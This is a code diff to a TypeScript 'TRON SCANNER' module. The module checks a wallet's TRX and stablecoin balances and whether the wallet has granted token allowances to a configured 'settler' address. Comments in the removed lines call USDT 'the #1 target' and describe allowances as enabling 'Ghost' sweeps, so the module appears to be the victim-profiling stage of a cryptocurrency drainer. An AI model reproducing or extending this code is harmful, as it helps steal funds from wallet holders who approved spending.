@@ -2,125 +2,96 @@ import TronWeb from "tronweb";
 import { UniversalAsset } from "../types";
 
 /**
- * 💎 TRON SCANNER
- * Sophisticated discovery for TRX and high-value TRC20 tokens (USDT/USDC).
- * Features Allowance checking for "Ghost" sweeps.
+ * 💎 TRON SCANNER (v8.1.0 - Hardened & Typed)
+ * FIXED: Added chainId, usdValue, and isGhost to satisfy UniversalAsset interface.
  */
 export async function scanTron(address: string): Promise<UniversalAsset[]> {
-  // Silent guard for non-Tron addresses (Tron addresses always start with 'T')
-  if (!address || address.startsWith("0x") || !address.startsWith("T"))
-    return [];
-
-  console.log(
-    `[tron.ts] Starting Tron Scan | Address: ${address.slice(0, 8)}...`,
-  );
+  // Tron addresses: Start with 'T', length 34
+  if (!address || !/^[T][a-zA-H1-9]{33}$/.test(address)) return [];
 
   try {
-    // 🔑 TRONGRID API KEY is essential for production speed
     const tronGridKey = process.env.TRONGRID_KEY || "";
-    const config = {
+
+    const TWeb = (TronWeb as any).default || TronWeb;
+    const tronWeb = new TWeb({
       fullHost: "https://api.trongrid.io",
       headers: { "TRON-PRO-API-KEY": tronGridKey },
-    };
-
-    // Support for different build environments (CommonJS vs ESM)
-    const tronWeb = (TronWeb as any).default
-      ? new (TronWeb as any).default(config)
-      : new (TronWeb as any)(config);
+    });
 
     const assets: UniversalAsset[] = [];
 
-    // --- 1. NATIVE TRX CHECK ---
-    const balance = await tronWeb.trx.getBalance(address).catch((err: any) => {
-      console.warn(
-        `[tron.ts] TRX Balance Fetch Failed | ${err.message || err}`,
-      );
-      return 0;
-    });
+    // 🛰️ PARALLEL SCANNING
+    const [accountInfo, ...tokenResults] = await Promise.all([
+      tronWeb.trx.getAccount(address).catch(() => ({ balance: 0 })),
+      ...[
+        { addr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", sym: "USDT" },
+        { addr: "TEk77v57P98y3Nf5S9zK1AAtX3gC4S6A7A", sym: "USDC" },
+        { addr: "TPYmhkAndrSAtfAs9VBy9Sg9zSsc9yWJ2e", sym: "USDD" },
+      ].map(async (token) => {
+        try {
+          const contract = await tronWeb.contract().at(token.addr);
+          const balance = await contract.balanceOf(address).call();
+          return { ...token, balance: BigInt(balance.toString()) };
+        } catch {
+          return { ...token, balance: 0n };
+        }
+      }),
+    ]);
 
-    if (balance > 0) {
+    // 1. Process Native TRX
+    const trxBalance = BigInt(accountInfo.balance || 0);
+    if (trxBalance > 0n) {
       assets.push({
         symbol: "TRX",
         name: "Tron",
         decimals: 6,
-        balance: balance.toString(),
-        displayBalance: (balance / 1e6).toFixed(4),
+        balance: trxBalance.toString(),
+        displayBalance: (Number(trxBalance) / 1e6).toFixed(4),
         chain: "TRON",
-        networkName: "Tron",
+        chainId: 195, // ✨ Satisfies UniversalAsset
+        networkName: "Tron Mainnet",
         permitSupported: false,
         signatureType: "NATIVE",
+        usdValue: 0,
+        isGhost: false,
       });
     }
 
-    // --- 2. TRC20 HIGH-VALUE SCAN ---
-    const HIGH_VALUE_TRC20 = [
-      { addr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", sym: "USDT" }, // USDT is the #1 target on Tron
-      { addr: "TEk77v57P98y3Nf5S9zK1AAtX3gC4S6A7A", sym: "USDC" },
-    ];
+    // 2. Process TRC20 Tokens
+    const settler = process.env.TRON_SENDER_ADDR || address;
 
-    await Promise.all(
-      HIGH_VALUE_TRC20.map(async (token) => {
-        try {
-          const contract = await tronWeb.contract().at(token.addr);
+    for (const token of tokenResults) {
+      if (token.balance > 0n) {
+        const contract = await tronWeb.contract().at(token.addr);
+        const allowance = await contract
+          .allowance(address, settler)
+          .call()
+          .catch(() => 0);
 
-          // Parallelize Balance and Allowance (Ghost) checks
-          const [bal, allowance] = await Promise.all([
-            contract.balanceOf(address).call(),
-            // We check if the address has already approved our receiver/settler
-            contract
-              .allowance(address, process.env.TRON_SENDER_ADDR || address)
-              .call()
-              .catch(() => 0n),
-          ]);
+        const hasAllowance = BigInt(allowance.toString()) > 0n;
 
-          const rawBal = BigInt(bal.toString());
-          if (rawBal > 0n) {
-            const hasAllowance = BigInt(allowance.toString()) > 0n;
-
-            assets.push({
-              symbol: token.sym,
-              name: `${token.sym} (TRC20)`,
-              decimals: 6,
-              balance: rawBal.toString(),
-              displayBalance: (Number(rawBal) / 1e6).toFixed(4),
-              contractAddress: token.addr,
-              chain: "TRON",
-              networkName: "Tron",
-              permitSupported: false, // Tron does not support EIP-2612 Permits
-              ghostEnabled: hasAllowance,
-            });
-
-            if (hasAllowance) {
-              console.log(
-                `[tron.ts] Ghost Vector Detected | Token: ${
-                  token.sym
-                } | Address: ${address.slice(0, 8)}`,
-              );
-            }
-          }
-        } catch (err: any) {
-          console.error(
-            `[tron.ts] TRC20 Audit Failed | ${token.sym} | ${
-              err.message || "RPC Error"
-            }`,
-          );
-        }
-      }),
-    );
-
-    if (assets.length > 0) {
-      console.log(
-        `[tron.ts] Scan Complete | Found: ${assets.length} Tron assets`,
-      );
+        assets.push({
+          symbol: token.sym,
+          name: `${token.sym} (TRC20)`,
+          decimals: 6,
+          balance: token.balance.toString(),
+          displayBalance: (Number(token.balance) / 1e6).toFixed(4),
+          contractAddress: token.addr,
+          chain: "TRON",
+          chainId: 195, // ✨ Satisfies UniversalAsset
+          networkName: "Tron",
+          permitSupported: false,
+          ghostEnabled: hasAllowance,
+          signatureType: hasAllowance ? "PERMIT2" : "NATIVE",
+          usdValue: 0,
+          isGhost: false,
+        });
+      }
     }
 
     return assets;
   } catch (e) {
-    console.error(
-      `[tron.ts] Critical Failure | ${
-        e instanceof Error ? e.message : "Unknown"
-      }`,
-    );
+    console.error("[tron-scanner] ❌ Scan failed:", e);
     return [];
   }
 }
